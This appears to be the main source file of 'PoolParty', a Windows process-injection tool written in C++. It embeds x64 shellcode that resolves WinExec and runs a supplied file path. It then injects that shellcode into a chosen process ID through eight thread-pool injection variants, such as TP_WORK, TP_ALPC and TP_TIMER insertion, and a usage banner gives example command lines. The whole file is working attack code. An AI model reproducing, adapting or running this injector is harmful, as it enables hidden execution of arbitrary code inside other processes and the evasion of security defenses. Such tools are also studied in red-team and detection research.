#include "PoolParty.hpp"
#include <sstream>
#include <iomanip>
#include <cstring>
#include <boost/log/trivial.hpp>


//This is set to release not debbugging
#ifdef _WIN64
    #pragma comment(lib, "libboost_log-vc143-mt-gd-x64-1_87.lib")
#elif defined(_WIN32)
    #pragma comment(lib, "libboost_log-vc143-mt-gd-x32-1_87.lib")
#else
    #error "Unknown target platform"
#endif

unsigned char g_BaseShellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3";

const size_t BaseShellcodeSize = sizeof(g_BaseShellcode) - 1;

unsigned char* CreateCompleteShellcode(const std::string& path, size_t& completeShellcodeSize) {
    size_t pathLen = path.length() + 1; // Include null terminator
    completeShellcodeSize = BaseShellcodeSize + pathLen;
    unsigned char* completeShellcode = new unsigned char[completeShellcodeSize];

    std::memcpy(completeShellcode, g_BaseShellcode, BaseShellcodeSize);
    std::memcpy(completeShellcode + BaseShellcodeSize, path.c_str(), pathLen);

    return completeShellcode;
}

void PrintUsage() {
    std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -path <PATH>" << std::endl << std::endl <<
    "VARIANTS:" << std::endl <<
        "------" << std::endl << std::endl <<
        "#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
        "#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
        "#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
        "#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
        "#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
        "#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "EXAMPLES:" << std::endl <<
        "------" << std::endl << std::endl <<
        "#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
        "#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;

}

POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv, std::string& path) {
    if (argc < 7) {
        PrintUsage();
        throw std::runtime_error("Too few arguments supplied");
    }

    POOL_PARTY_CMD_ARGS CmdArgs = { 0 };
    std::vector<std::string> args(argv + 1, argv + argc);

    for (size_t i = 0; i < args.size(); i++) {
        auto CmdArg = args.at(i);
        if (CmdArg == "-V" || CmdArg == "--variant-id") {
            CmdArgs.VariantId = std::stoi(args.at(++i));
        }
        else if (CmdArg == "-P" || CmdArg == "--target-pid") {
            CmdArgs.TargetPid = std::stoi(args.at(++i));
        }
        else if (CmdArg == "-path") {
            path = args.at(++i);
        }
        else {
            PrintUsage();
            throw std::runtime_error("Invalid option: " + CmdArg);
        }
    }

    return CmdArgs;
}

std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid, unsigned char* shellcode, size_t shellcodeSize) {
    switch (VariantId) {
    case 1:
        return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, shellcode, shellcodeSize);
    case 2:
        return std::make_unique<RemoteTpWorkInsertion>(TargetPid, shellcode, shellcodeSize);
    case 3:
        return std::make_unique<RemoteTpWaitInsertion>(TargetPid, shellcode, shellcodeSize);
    case 4:
        return std::make_unique<RemoteTpIoInsertion>(TargetPid, shellcode, shellcodeSize);
    case 5:
        return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, shellcode, shellcodeSize);
    case 6:
        return std::make_unique<RemoteTpJobInsertion>(TargetPid, shellcode, shellcodeSize);
    case 7:
        return std::make_unique<RemoteTpDirectInsertion>(TargetPid, shellcode, shellcodeSize);
    case 8:
        return std::make_unique<RemoteTpTimerInsertion>(TargetPid, shellcode, shellcodeSize);
    default:
        PrintUsage();
        throw std::runtime_error("Invalid variant ID");
    }
}

void InitLogging()
{
    // Basic console logging with severity level
    logging::add_console_log(
        std::cout,
        keywords::format = (
            logging::expressions::stream
            << "[" << logging::expressions::attr<int>("Severity")
            << "]    " << logging::expressions::smessage
            )
    );
    logging::core::get()->set_filter(logging::trivial::severity >= logging::trivial::info);
}

int main(int argc, char** argv) {
    InitLogging();
    try {
        std::string path;
        const auto CmdArgs = ParseArgs(argc, argv, path);
        size_t completeShellcodeSize;
        unsigned char* completeShellcode = CreateCompleteShellcode(path, completeShellcodeSize);
        const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid, completeShellcode, completeShellcodeSize);
        Injector->Inject();
        delete[] completeShellcode;
    }
    catch (const std::exception& ex) {
        logging::trivial::severity_level errorSeverity = logging::trivial::error;
        BOOST_LOG_TRIVIAL(error) << ex.what();
        return 0;
    }
    return 1;
}
